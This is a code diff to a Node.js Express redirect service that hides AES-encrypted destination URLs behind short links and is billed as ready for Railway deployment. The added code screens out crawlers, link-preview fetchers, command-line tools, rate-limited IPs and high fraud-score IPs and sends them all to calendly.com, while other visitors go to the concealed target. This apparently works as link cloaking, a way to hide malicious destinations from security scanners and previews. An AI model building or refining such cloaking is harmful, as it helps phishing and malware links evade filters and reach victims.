@@ -1,5 +1,4 @@
-// server.js production-ready version for Railway deployment
-
+// server.js - Complete production-ready version for Railway deployment
 import express from "express";
 import crypto from "crypto";
 import dotenv from "dotenv";
@@ -10,6 +9,10 @@ import fetch from "node-fetch";
 dotenv.config();
 
 const app = express();
+
+// Trust proxy for Railway deployment
+app.set('trust proxy', 1);
+
 app.use(express.json());
 
 const AES_KEY = Buffer.from(process.env.AES_KEY, "hex");
@@ -33,6 +36,105 @@ function saveAliases() {
   fs.writeFileSync(ALIAS_FILE, JSON.stringify(aliases, null, 2));
 }
 
+// ===== SECURITY MIDDLEWARE =====
+app.use((req, res, next) => {
+  // Security headers
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('X-Frame-Options', 'DENY');
+  res.setHeader('X-XSS-Protection', '1; mode=block');
+  res.setHeader('Referrer-Policy', 'no-referrer');
+  res.setHeader('Content-Security-Policy', "default-src 'none'");
+  
+  // Remove server fingerprinting
+  res.removeHeader('X-Powered-By');
+  
+  next();
+});
+
+// Request logging for monitoring
+app.use((req, res, next) => {
+  const ip = req.ip || req.connection.remoteAddress;
+  const userAgent = req.get('User-Agent') || 'Unknown';
+  console.log(`${new Date().toISOString()} - ${ip} - ${req.method} ${req.path} - ${userAgent}`);
+  next();
+});
+
+// ===== BOT DETECTION FUNCTIONS =====
+function detectBotByUserAgent(userAgent) {
+  const botPatterns = [
+    /bot/i, /crawler/i, /spider/i, /scraper/i,
+    /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i,
+    /whatsapp/i, /telegram/i, /discord/i,
+    /curl/i, /wget/i, /python/i, /requests/i,
+    /postman/i, /insomnia/i, /httpie/i,
+    /apache-httpclient/i, /java/i, /okhttp/i
+  ];
+  
+  return botPatterns.some(pattern => pattern.test(userAgent || ''));
+}
+
+function detectBotByHeaders(headers) {
+  // Missing common browser headers
+  const requiredHeaders = ['accept', 'accept-language', 'accept-encoding'];
+  const missingHeaders = requiredHeaders.filter(h => !headers[h]);
+  
+  // Suspicious header combinations
+  const hasUserAgent = !!headers['user-agent'];
+  const hasAccept = !!headers['accept'];
+  
+  return missingHeaders.length > 1 || (!hasUserAgent && !hasAccept);
+}
+
+// Rate limiting per IP
+const ipRequestCounts = new Map();
+const RATE_LIMIT_WINDOW = 60000; // 1 minute
+const MAX_REQUESTS_PER_MINUTE = 10;
+
+function isRateLimited(ip) {
+  const now = Date.now();
+  const ipData = ipRequestCounts.get(ip) || { count: 0, windowStart: now };
+  
+  // Reset window if expired
+  if (now - ipData.windowStart > RATE_LIMIT_WINDOW) {
+    ipData.count = 0;
+    ipData.windowStart = now;
+  }
+  
+  ipData.count++;
+  ipRequestCounts.set(ip, ipData);
+  
+  return ipData.count > MAX_REQUESTS_PER_MINUTE;
+}
+
+async function checkIpReputation(ip) {
+  if (!IPQS_API_KEY) return false;
+  try {
+    const res = await fetch(`https://ipqualityscore.com/api/json/ip/${IPQS_API_KEY}/${ip}`);
+    const data = await res.json();
+    return data && data.fraud_score && data.fraud_score > 80;
+  } catch {
+    return false;
+  }
+}
+
+// Comprehensive bot detection
+async function isSuspiciousRequest(req) {
+  const ip = req.ip || req.connection.remoteAddress || '';
+  const userAgent = req.get('User-Agent') || '';
+  
+  // Multiple detection methods
+  const checks = [
+    detectBotByUserAgent(userAgent),
+    detectBotByHeaders(req.headers),
+    isRateLimited(ip),
+    await checkIpReputation(ip)
+  ];
+  
+  // If any check fails, it's suspicious
+  return checks.some(Boolean);
+}
+
+// ===== ENCRYPTION FUNCTIONS =====
 function encryptURL(url) {
   const iv = crypto.randomBytes(16);
   const cipher = crypto.createCipheriv("aes-256-cbc", AES_KEY, iv);
@@ -62,17 +164,7 @@ function decryptURL(encryptedString) {
   return decrypted;
 }
 
-async function checkIpReputation(ip) {
-  if (!IPQS_API_KEY) return false;
-  try {
-    const res = await fetch(`https://ipqualityscore.com/api/json/ip/${IPQS_API_KEY}/${ip}`);
-    const data = await res.json();
-    return data && data.fraud_score && data.fraud_score > 80;
-  } catch {
-    return false;
-  }
-}
-
+// ===== ROUTES =====
 app.get("/create", (req, res) => {
   const target = req.query.url;
   if (!target) return res.status(400).send("Missing 'url' parameter");
@@ -107,19 +199,78 @@ app.post("/alias/create", (req, res) => {
 
 app.get("/r/:id", async (req, res) => {
   const id = req.params.id;
+  const ip = req.ip || req.connection.remoteAddress || '';
+  const userAgent = req.get('User-Agent') || '';
+  
+  // Log the attempt
+  console.log(`Redirect attempt: ${id} from ${ip} - ${userAgent}`);
+  
+  // Check if request is suspicious
+  if (await isSuspiciousRequest(req)) {
+    console.log(`Blocked suspicious request from ${ip}`);
+    return res.redirect("https://calendly.com");
+  }
+  
+  // Get encrypted string (from alias or direct)
   const encryptedString = aliases[id] || id;
-
-  const ip = req.ip || req.connection.remoteAddress || "";
-  const isBot = await checkIpReputation(ip);
-  if (isBot) return res.redirect("https://calendly.com");
-
+  
+  // Decrypt and validate URL
   const targetUrl = decryptURL(encryptedString);
-  if (!targetUrl) return res.redirect("https://calendly.com");
-
+  if (!targetUrl) {
+    console.log(`Invalid/expired link: ${id}`);
+    return res.redirect("https://calendly.com");
+  }
+  
+  // Validate URL format
+  try {
+    new URL(targetUrl);
+  } catch {
+    console.log(`Invalid URL format: ${targetUrl}`);
+    return res.redirect("https://calendly.com");
+  }
+  
+  // Add small delay to slow down automated requests
+  await new Promise(resolve => setTimeout(resolve, 100));
+  
+  console.log(`Redirecting to: ${targetUrl}`);
   res.redirect(targetUrl);
 });
 
+// ===== ERROR HANDLING =====
+// Global error handling
+app.use((err, req, res, next) => {
+  console.error('Unhandled error:', err);
+  res.status(500).redirect("https://calendly.com");
+});
+
+// 404 handler
+app.use((req, res) => {
+  res.status(404).redirect("https://calendly.com");
+});
+
+// ===== SERVER STARTUP =====
 const PORT = process.env.PORT || 3001;
 app.listen(PORT, () => console.log(`Redirect service running on port ${PORT}`));
 
-// ✅ Ready for Railway deployment with alias, redirect, and bot fallback to Calendly
+// Graceful shutdown
+process.on('SIGTERM', () => {
+  console.log('SIGTERM received, shutting down gracefully');
+  process.exit(0);
+});
+
+process.on('uncaughtException', (err) => {
+  console.error('Uncaught Exception:', err);
+  process.exit(1);
+});
+
+// Clean up rate limiting data periodically
+setInterval(() => {
+  const now = Date.now();
+  for (const [ip, data] of ipRequestCounts.entries()) {
+    if (now - data.windowStart > RATE_LIMIT_WINDOW * 2) {
+      ipRequestCounts.delete(ip);
+    }
+  }
+}, RATE_LIMIT_WINDOW);
+
+// ✅ Complete production-ready server with aggressive bot protection
